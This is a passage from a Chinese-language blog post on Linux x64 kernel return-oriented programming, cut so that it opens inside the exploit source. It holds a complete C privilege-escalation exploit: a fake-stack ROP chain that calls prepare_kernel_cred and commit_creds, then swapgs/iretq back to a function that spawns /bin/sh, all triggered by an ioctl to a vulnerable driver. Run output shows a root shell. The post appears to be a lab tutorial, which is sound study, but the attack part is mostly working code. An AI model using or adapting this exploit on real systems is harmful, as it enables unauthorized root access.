user_ss;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_rflags;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">save_state</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">    <span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line">    <span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line">    <span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">    <span class="string">&quot;popq %2\n&quot;</span></span><br><span class="line">    : <span class="string">&quot;=r&quot;</span> (user_cs), <span class="string">&quot;=r&quot;</span> (user_ss), <span class="string">&quot;=r&quot;</span> (user_rflags) : : <span class="string">&quot;memory&quot;</span>         );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!getuid())</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usage</span><span class="params">(<span class="keyword">char</span> *bin_name)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s array_offset_decimal array_base_address_hex\n&quot;</span>, bin_name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">drv_req</span> <span class="title">req</span>;</span></span><br><span class="line">    <span class="keyword">void</span> *mapped, *temp_stack;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> base_addr, stack_addr, mmap_addr, *fake_stack;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">3</span>) &#123;</span><br><span class="line">        usage(argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    req.offset = strtoul(argv[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">10</span>);</span><br><span class="line">    base_addr  = strtoul(argv[<span class="number">2</span>], <span class="literal">NULL</span>, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;array base address = 0x%lx\n&quot;</span>, base_addr);</span><br><span class="line">    stack_addr = (base_addr + (req.offset * <span class="number">8</span>)) &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">&quot;stack address = 0x%lx\n&quot;</span>, stack_addr);</span><br><span class="line"></span><br><span class="line">    mmap_addr = stack_addr &amp; <span class="number">0xffff0000</span>;</span><br><span class="line">    assert((mapped = mmap((<span class="keyword">void</span>*)mmap_addr, <span class="number">0x20000</span>, <span class="number">7</span>, <span class="number">0x32</span>, <span class="number">0</span>, <span class="number">0</span>)) == (<span class="keyword">void</span>*)mmap_addr);</span><br><span class="line">    assert((temp_stack = mmap((<span class="keyword">void</span>*)<span class="number">0x30000000</span>, <span class="number">0x10000000</span>, <span class="number">7</span>, <span class="number">0x32</span>, <span class="number">0</span>, <span class="number">0</span>)) == (<span class="keyword">void</span>*)<span class="number">0x30000000</span>);</span><br><span class="line"></span><br><span class="line">    save_state();</span><br><span class="line">    fake_stack = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(stack_addr);</span><br><span class="line">    *fake_stack ++= <span class="number">0xffffffff810d783d</span>UL; <span class="comment">/* pop %rdi; ret */</span></span><br><span class="line"></span><br><span class="line">    fake_stack = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(stack_addr + <span class="number">0x9d5f</span>);</span><br><span class="line"></span><br><span class="line">    *fake_stack ++= <span class="number">0x0</span>UL;                <span class="comment">/* NULL */</span> </span><br><span class="line">    *fake_stack ++= <span class="number">0xffffffff81092870</span>UL; <span class="comment">/* prepare_kernel_cred() */</span></span><br><span class="line"></span><br><span class="line">    *fake_stack ++= <span class="number">0xffffffff8110eaa3</span>UL; <span class="comment">/* pop %rdx; ret */</span></span><br><span class="line">    <span class="comment">//*fake_stack ++= 0xffffffff81092570UL; /* commit_creds() */</span></span><br><span class="line">    *fake_stack ++= <span class="number">0xffffffff81092576</span>UL; <span class="comment">// commit_creds() + 2 instructions</span></span><br><span class="line"></span><br><span class="line">    *fake_stack ++= <span class="number">0xffffffff81036321</span>UL; <span class="comment">/* mov %rax, %rdi; call %rdx */</span></span><br><span class="line"></span><br><span class="line">    *fake_stack ++= <span class="number">0xffffffff81051794</span>UL; <span class="comment">// swapgs ; pop rbp ; ret</span></span><br><span class="line">    *fake_stack ++= <span class="number">0xdeadbeef</span>UL;         <span class="comment">// dummy placeholder </span></span><br><span class="line"></span><br><span class="line">    *fake_stack ++= <span class="number">0xffffffff81051fe6</span>UL; <span class="comment">/* iretq */</span></span><br><span class="line">    *fake_stack ++= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)shell; <span class="comment">/* spawn a shell */</span></span><br><span class="line">    *fake_stack ++= user_cs;              <span class="comment">/* saved CS */</span></span><br><span class="line">    *fake_stack ++= user_rflags;          <span class="comment">/* saved EFLAGS */</span></span><br><span class="line">    *fake_stack ++= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(temp_stack+<span class="number">0x5000000</span>);  <span class="comment">/* mmaped stack region in user space */</span></span><br><span class="line">    *fake_stack ++= user_ss;              <span class="comment">/* saved SS */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//map = mmap((void *)..., ..., 3, 0x32, 0, 0);</span></span><br><span class="line"></span><br><span class="line">    fd = open(DEVICE_PATH, O_RDONLY);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ioctl(fd, <span class="number">0</span>, &amp;req);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p>首先用基地址获取数组偏移量：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ dmesg | tail -1</span><br><span class="line">[  244.142035] addr(ops) &#x3D; ffffffffa02d8340</span><br><span class="line">$ .&#x2F;find_offset.py ffffffffa02d8340 stackpivots </span><br><span class="line">offset &#x3D; 18446744073644277591</span><br><span class="line">gadget &#x3D; xchg eax, esp ; ret 0x14ff</span><br><span class="line">stack addr &#x3D; 810d7df8</span><br></pre></td></tr></table></figure>
+<p>然后，将基地址和偏移地址传递给ROP：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ gcc rop_exploit.c -O2 -o rop_exploit</span><br><span class="line">$ .&#x2F;rop_exploit 18446744073644277591 ffffffffa02d8340</span><br><span class="line">array base address &#x3D; 0xffffffffa02d8340</span><br><span class="line">stack address &#x3D; 0x810d7df8</span><br><span class="line"># </span><br></pre></td></tr></table></figure>
+<p><img src="/images/kernelrop/rootshell.png"><br>成功获取root！<br><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1nvDR1Wl">完整驱动下载</a><br><strong>reference</strong><br><a target="_blank" rel="noopener" href="https://www.trustwave.com/Resources/SpiderLabs-Blog/Linux-Kernel-ROP---Ropping-your-way-to---(Part-1)/">Linux Kernel ROP - Ropping your way to # (Part 1)</a><br><a target="_blank" rel="noopener" href="https://www.trustwave.com/Resources/SpiderLabs-Blog/Linux-Kernel-ROP---Ropping-your-way-to---(Part-2)/">Linux Kernel ROP - Ropping your way to # (Part 2)</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2017/06/28/Linux-x64%E5%86%85%E6%A0%B8ROP/" data-id="ckhe7o4lo002qchl7c7nsblzn" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Kernel/" rel="tag">Kernel</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2017/07/01/VirtualBox%E4%B8%8A%E8%B0%83%E8%AF%95Linux-Kernel/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          VirtualBox上调试Linux Kernel
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2017/06/26/%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8BHouse-of-Spirit/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">堆漏洞之House of Spirit</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ARM/" rel="tag">ARM</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Algorithms/" rel="tag">Algorithms</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Android/" rel="tag">Android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Blockchain/" rel="tag">Blockchain</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/C-C/" rel="tag">C/C++</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/" rel="tag">Crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Docker/" rel="tag">Docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fuzzing/" rel="tag">Fuzzing</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IoT/" rel="tag">IoT</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Java/" rel="tag">Java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kernel/" rel="tag">Kernel</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Machine-Learning/" rel="tag">Machine Learning</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Reverse/" rel="tag">Reverse</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Symbolic-Execution/" rel="tag">Symbolic Execution</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tensorflow/" rel="tag">Tensorflow</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Virtual/" rel="tag">Virtual</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/ARM/" style="font-size: 11px;">ARM</a> <a href="/tags/Algorithms/" style="font-size: 10px;">Algorithms</a> <a href="/tags/Android/" style="font-size: 20px;">Android</a> <a href="/tags/Blockchain/" style="font-size: 11px;">Blockchain</a> <a href="/tags/C-C/" style="font-size: 18px;">C/C++</a> <a href="/tags/Crypto/" style="font-size: 10px;">Crypto</a> <a href="/tags/Docker/" style="font-size: 10px;">Docker</a> <a href="/tags/Fuzzing/" style="font-size: 15px;">Fuzzing</a> <a href="/tags/IoT/" style="font-size: 12px;">IoT</a> <a href="/tags/Java/" style="font-size: 14px;">Java</a> <a href="/tags/Kernel/" style="font-size: 19px;">Kernel</a> <a href="/tags/Machine-Learning/" style="font-size: 17px;">Machine Learning</a> <a href="/tags/Pwn/" style="font-size: 19px;">Pwn</a> <a href="/tags/Reverse/" style="font-size: 13px;">Reverse</a> <a href="/tags/Symbolic-Execution/" style="font-size: 12px;">Symbolic Execution</a> <a href="/tags/Tensorflow/" style="font-size: 10px;">Tensorflow</a> <a href="/tags/Virtual/" style="font-size: 16px;">Virtual</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">June 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">June 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/04/">April 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/02/">February 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">December 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">May 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">March 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">January 2016</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/07/29/so%E6%96%87%E4%BB%B6%E7%9A%84-init-array%E6%AE%B5%E4%B8%AD%E6%B7%BB%E5%8A%A0%E4%BB%A3%E7%A0%81/">so文件的.init_array段中添加代码</a>
+          </li>
+        
+          <li>
+            <a href="/2020/07/09/PID-namespace/">PID namespace</a>
+          </li>
+        
+          <li>
+            <a href="/2020/07/08/Mount-namespace/">Mount namespace</a>
+          </li>
+        
+          <li>
+            <a href="/2020/07/06/User-namespace/">User namespace</a>
+          </li>
+        
+          <li>
+            <a href="/2020/07/01/UnionFS%E6%8A%80%E6%9C%AF/">UnionFS技术</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
